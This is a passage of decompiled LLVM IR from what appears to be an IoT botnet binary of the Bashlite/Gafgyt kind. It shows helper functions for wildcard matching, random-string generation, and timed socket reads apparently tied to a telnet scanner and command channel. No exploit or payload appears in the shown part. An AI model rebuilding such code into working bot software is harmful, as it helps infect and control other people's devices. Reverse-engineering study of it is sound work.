  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2b2f0.33, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a42 = load i8, i8* %arg1, align 1
  %v2_93a84 = icmp eq i8 %v2_93a42, 0
  br i1 %v2_93a84, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.06, 16
  %v2_937c = load i8, i8* %stack_var_-28.05, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1c808.42 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a07, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a07 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.06 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.05 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.06, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.06, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9580 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9580, i32* @ip, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_964c = load i32, i32* @r4, align 4
  %v6_964c = load i32, i32* @fp, align 4
  %v0_9658 = load i32, i32* %r0.global-to-local, align 4
  %v5_96ec24 = icmp sgt i32 %arg2, 0
  br i1 %v5_96ec24, label %dec_label_pc_9674, label %dec_label_pc_96f0

dec_label_pc_9674:                                ; preds = %entry, %dec_label_pc_9674
  %storemerge725 = phi i32 [ %v1_96d8, %dec_label_pc_9674 ], [ 0, %entry ]
  %v2_9680 = add i32 %storemerge725, %v0_9658
  store i32 %v2_9680, i32* @r4, align 4
  %v0_9684 = call i32 @rand_cmwc()
  store i32 %v0_9684, i32* %r0.global-to-local, align 4
  %v3_9694 = udiv i32 %v0_9684, 26
  %tmp = mul nsw i32 %v3_9694, -2
  %v2_96b8 = add i32 %v0_9684, %tmp
  %fold = add i32 %v2_96b8, 65
  %v1_96d0 = trunc i32 %fold to i8
  %v2_96d0 = load i32, i32* @r4, align 4
  %v3_96d0 = inttoptr i32 %v2_96d0 to i8*
  store i8 %v1_96d0, i8* %v3_96d0, align 1
  %v1_96d8 = add nuw nsw i32 %storemerge725, 1
  %v5_96ec = icmp slt i32 %v1_96d8, %arg2
  br i1 %v5_96ec, label %dec_label_pc_9674, label %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge

dec_label_pc_96e0.dec_label_pc_96f0_crit_edge:    ; preds = %dec_label_pc_9674
  %v1_96f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge, %entry
  %v1_96f8 = phi i32 [ %v1_96f8.pre, %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge ], [ %v0_9658, %entry ]
  store i32 %v3_964c, i32* @r4, align 4
  store i32 %v6_964c, i32* @fp, align 4
  ret i32 %v1_96f8

; uselistorder directives
  uselistorder i32 %v1_96d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9674, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9754.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9704 = load i32, i32* @fp, align 4
  store i32 %v3_9704, i32* %stack_var_-16, align 4
  store i32 38668, i32* %stack_var_-4, align 4
  %v2_9708 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9708, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_972c = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_9740 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9754.lr.ph, %dec_label_pc_9754
  %storemerge628 = phi i32 [ 0, %dec_label_pc_9754.lr.ph ], [ %v1_9768, %dec_label_pc_9754 ]
  %v5_9760 = mul nuw nsw i32 %storemerge628, 4
  %v6_9760 = add i32 %v5_9760, %v2_9740
  %v7_9760 = inttoptr i32 %v6_9760 to i32*
  store i32 0, i32* %v7_9760, align 4
  %v1_9768 = add nuw nsw i32 %storemerge628, 1
  %tmp53 = icmp ult i32 %v1_9768, 32
  br i1 %tmp53, label %dec_label_pc_9754, label %dec_label_pc_977c

dec_label_pc_977c:                                ; preds = %dec_label_pc_9754
  %v13_9704 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9780 = udiv i32 %arg1, 32
  %v3_978c = mul nuw nsw i32 %v3_9780, 4
  %v2_9794 = add nsw i32 %v3_978c, -160
  %v2_9798 = add i32 %v2_9794, %v13_9704
  %v1_979c = inttoptr i32 %v2_9798 to i32*
  %v2_979c = load i32, i32* %v1_979c, align 4
  %v1_97a4 = urem i32 %arg1, 32
  %v6_97ac = shl i32 1, %v1_97a4
  %v2_97b0 = or i32 %v2_979c, %v6_97ac
  store i32 %v2_97b0, i32* %v1_979c, align 4
  %v1_97d0 = add i32 %arg1, 1
  %v2_97dc = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_97f0 = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_9804 = icmp sgt i32 %v5_97f0, 0
  br i1 %v5_9804, label %dec_label_pc_9998.preheader, label %dec_label_pc_9904.preheader

dec_label_pc_9904.preheader:                      ; preds = %dec_label_pc_977c
  %v7_990c24 = icmp slt i32 %tmp34, 10
  br i1 %v7_990c24, label %dec_label_pc_9844.lr.ph, label %dec_label_pc_9998.preheader

dec_label_pc_9844.lr.ph:                          ; preds = %dec_label_pc_9904.preheader, %dec_label_pc_98f8
  %stack_var_-44.025 = phi i32 [ %v1_98fc, %dec_label_pc_98f8 ], [ %tmp34, %dec_label_pc_9904.preheader ]
  %v2_9810 = load i32, i32* @global_var_272d0.45, align 4
  %v3_981c = call i32 @Rootsprintf(i32 %v2_9810, i32 ptrtoint ([5 x i8]* @global_var_1cc08.47 to i32))
  store i32 30, i32* %stack_var_-184, align 4
  br label %dec_label_pc_9844

dec_label_pc_9844:                                ; preds = %dec_label_pc_9844.lr.ph, %dec_label_pc_9844
  %storemerge716 = phi i32 [ 0, %dec_label_pc_9844.lr.ph ], [ %v1_9858, %dec_label_pc_9844 ]
  %v5_9850 = mul nuw nsw i32 %storemerge716, 4
  %v6_9850 = add i32 %v5_9850, %v2_9740
  %v7_9850 = inttoptr i32 %v6_9850 to i32*
  store i32 0, i32* %v7_9850, align 4
  %v1_9858 = add nuw nsw i32 %storemerge716, 1
  %tmp54 = icmp ult i32 %v1_9858, 32
  br i1 %tmp54, label %dec_label_pc_9844, label %dec_label_pc_986c

dec_label_pc_986c:                                ; preds = %dec_label_pc_9844
  %v2_988c = load i32, i32* %v1_979c, align 4
  %v2_98a0 = or i32 %v2_988c, %v6_97ac
  store i32 %v2_98a0, i32* %v1_979c, align 4
  store i32 0, i32* @r2, align 4
  %v5_98e0 = call i32 @__libc_select(i32 %v1_97d0, i32 %v2_9740, i32 0, i32 %v2_9740, i32 %v2_97dc)
  %v5_98f4 = icmp sgt i32 %v5_98e0, 0
  br i1 %v5_98f4, label %dec_label_pc_9998.preheader, label %dec_label_pc_98f8

dec_label_pc_98f8:                                ; preds = %dec_label_pc_986c
  %v1_98fc = add nsw i32 %stack_var_-44.025, 1
  %v7_990c = icmp slt i32 %v1_98fc, 10
  br i1 %v7_990c, label %dec_label_pc_9844.lr.ph, label %dec_label_pc_9998.preheader

dec_label_pc_9998.preheader:                      ; preds = %dec_label_pc_98f8, %dec_label_pc_986c, %dec_label_pc_9904.preheader, %dec_label_pc_977c
  %v2_992c = ptrtoint i8* %stack_var_-185 to i32
  %not.v7_99a058 = icmp sgt i32 %arg3, 1
  %v2_99b860 = icmp eq i1 %not.v7_99a058, false
  br i1 %v2_99b860, label %dec_label_pc_99c0, label %dec_label_pc_9924

dec_label_pc_9924:                                ; preds = %dec_label_pc_9998.preheader, %dec_label_pc_998c
  %v1_999c63.in = phi i32 [ %v1_999c63, %dec_label_pc_998c ], [ %arg3, %dec_label_pc_9998.preheader ]
  %stack_var_-40.062 = phi i8* [ %v5_997c, %dec_label_pc_998c ], [ %arg2, %dec_label_pc_9998.preheader ]
  %stack_var_-36.061 = phi i32 [ %v1_9990, %dec_label_pc_998c ], [ 0, %dec_label_pc_9998.preheader ]
  %v1_999c63 = add i32 %v1_999c63.in, -1
  %v2_9928 = load i32, i32* @global_var_272d0.45, align 4
  %v5_9940 = call i32 @__libc_recv(i32 %v2_9928, i32 %v2_992c, i32 1, i32 0, i32 %v1_999c63)
  %v7_9948 = icmp eq i32 %v5_9940, 1
  br i1 %v7_9948, label %dec_label_pc_9968, label %dec_label_pc_9950

dec_label_pc_9950:                                ; preds = %dec_label_pc_9924
  store i8 0, i8* %stack_var_-40.062, align 1
  br label %dec_label_pc_99d4

dec_label_pc_9968:                                ; preds = %dec_label_pc_9924
  %v3_9968 = load i8, i8* %stack_var_-185, align 1
  %v4_996c = ptrtoint i8* %stack_var_-40.062 to i32
  store i8 %v3_9968, i8* %stack_var_-40.062, align 1
  %v1_9978 = add i32 %v4_996c, 1
  %v5_997c = inttoptr i32 %v1_9978 to i8*
  %v3_9980 = load i8, i8* %stack_var_-185, align 1
  %v7_9984 = icmp eq i8 %v3_9980, 10
  br i1 %v7_9984, label %dec_label_pc_99c0, label %dec_label_pc_998c

dec_label_pc_998c:                                ; preds = %dec_label_pc_9968
  %v1_9990 = add i32 %stack_var_-36.061, 1
  %not.v7_99a0 = icmp sgt i32 %v1_999c63, 1
  %v2_99b8 = icmp eq i1 %not.v7_99a0, false
  br i1 %v2_99b8, label %dec_label_pc_99c0, label %dec_label_pc_9924

dec_label_pc_99c0:                                ; preds = %dec_label_pc_9968, %dec_label_pc_998c, %dec_label_pc_9998.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_9998.preheader ], [ %v1_9990, %dec_label_pc_998c ], [ %stack_var_-36.061, %dec_label_pc_9968 ]
  %stack_var_-40.1 = phi i8* [ %arg2, %dec_label_pc_9998.preheader ], [ %v5_997c, %dec_label_pc_998c ], [ %v5_997c, %dec_label_pc_9968 ]
  store i8 0, i8* %stack_var_-40.1, align 1
  br label %dec_label_pc_99d4

dec_label_pc_99d4:                                ; preds = %dec_label_pc_9950, %dec_label_pc_99c0
  %storemerge = phi i32 [ -1, %dec_label_pc_9950 ], [ %stack_var_-36.0.lcssa, %dec_label_pc_99c0 ]
  %v2_99e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_99e0, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_999c63, { 1, 0, 2 }
  uselistorder i8* %stack_var_-40.062, { 1, 2, 0 }
  uselistorder i32 %v1_98fc, { 1, 0 }
  uselistorder i32 %storemerge716, { 1, 0 }
  uselistorder i32 %storemerge628, { 1, 0 }
  uselistorder i32 %v2_9740, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 0, 2, 1 }
  uselistorder i8* %stack_var_-185, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_99d4, { 1, 0 }
  uselistorder label %dec_label_pc_99c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9844, { 1, 0 }
  uselistorder label %dec_label_pc_9844.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_9754, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_99f0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_99f0, i32* @ip, align 4
  %v3_99f4 = load i32, i32* @fp, align 4
  store i32 39420, i32* %stack_var_-4, align 4
  %v2_99f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_99f8, i32* @fp, align 4
  %v1_9a08 = add i32 %arg1, 4
  %v2_9a08 = inttoptr i32 %v1_9a08 to i32*
  %v3_9a08 = load i32, i32* %v2_9a08, align 4
  store i32 %v3_9a08, i32* @r0, align 4
  %v1_9a14 = call i32 @__GI_inet_ntoa(i32 %v3_9a08)
  store i32 %v3_99f4, i32* @fp, align 4
  ret i32 %v1_9a14

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_9a30 = load i32, i32* @fp, align 4
  store i32 39480, i32* %stack_var_-4, align 4
  %v2_9a34 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9a34, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_9a5c = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_9a70 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_9a80 = load i8, i8* %arg3, align 1
  %v2_9a84 = icmp eq i8 %v2_9a80, -1
  br i1 %v2_9a84, label %dec_label_pc_9a8c, label %dec_label_pc_9a9c

dec_label_pc_9a8c:                                ; preds = %entry
  %v3_9a80 = zext i8 %v2_9a80 to i32
  %v6_9a98 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %v3_9a80, i32 %v5_9a70)
  br label %dec_label_pc_9a9c

dec_label_pc_9a9c:                                ; preds = %entry, %dec_label_pc_9a8c
  %v3_9aa0 = load i32, i32* %stack_var_0, align 4
  %v3_9aa4 = call i32 @contains_string(i32 %tmp, i32 %v3_9aa0)
  %v2_9aac = icmp ne i32 %v3_9aa4, 0
  %. = zext i1 %v2_9aac to i32
  store i32 %v3_9a30, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9a80, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9a9c, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9b20.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9ae0 = load i32, i32* @fp, align 4
  store i32 %v3_9ae0, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9b0c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9b20

dec_label_pc_9b20:                                ; preds = %dec_label_pc_9b20.lr.ph, %dec_label_pc_9b20
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9b20.lr.ph ], [ %v1_9b34, %dec_label_pc_9b20 ]
  %v5_9b2c = mul nuw nsw i32 %storemerge25, 4
  %v6_9b2c = add i32 %v5_9b2c, %v2_9b0c
  %v7_9b2c = inttoptr i32 %v6_9b2c to i32*
  store i32 0, i32* %v7_9b2c, align 4
  %v1_9b34 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9b34, 32
  br i1 %tmp21, label %dec_label_pc_9b20, label %dec_label_pc_9b48

dec_label_pc_9b48:                                ; preds = %dec_label_pc_9b20
  %v13_9ae0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9b4c = udiv i32 %arg1, 32
  %v3_9b58 = mul nuw nsw i32 %v3_9b4c, 4
  %v2_9b60 = add nsw i32 %v3_9b58, -136
  %v2_9b64 = add i32 %v2_9b60, %v13_9ae0
  %v1_9b68 = inttoptr i32 %v2_9b64 to i32*
  %v2_9b68 = load i32, i32* %v1_9b68, align 4
  %v1_9b70 = urem i32 %arg1, 32
  %v6_9b78 = shl i32 1, %v1_9b70
  %v2_9b7c = or i32 %v2_9b68, %v6_9b78
  store i32 %v2_9b7c, i32* %v1_9b68, align 4
  %v1_9b9c = add i32 %arg1, 1
  %v2_9ba4 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9bb8 = call i32 @__libc_select(i32 %v1_9b9c, i32 %v2_9b0c, i32 0, i32 0, i32 %v2_9ba4)
  %v5_9bc4 = icmp sgt i32 %v5_9bb8, 0
  br i1 %v5_9bc4, label %dec_label_pc_9bd4, label %dec_label_pc_9bc8

dec_label_pc_9bc8:                                ; preds = %dec_label_pc_9b48
  br label %dec_label_pc_9bf4

dec_label_pc_9bd4:                                ; preds = %dec_label_pc_9b48
  %v5_9be8 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9bf4

dec_label_pc_9bf4:                                ; preds = %dec_label_pc_9bc8, %dec_label_pc_9bd4
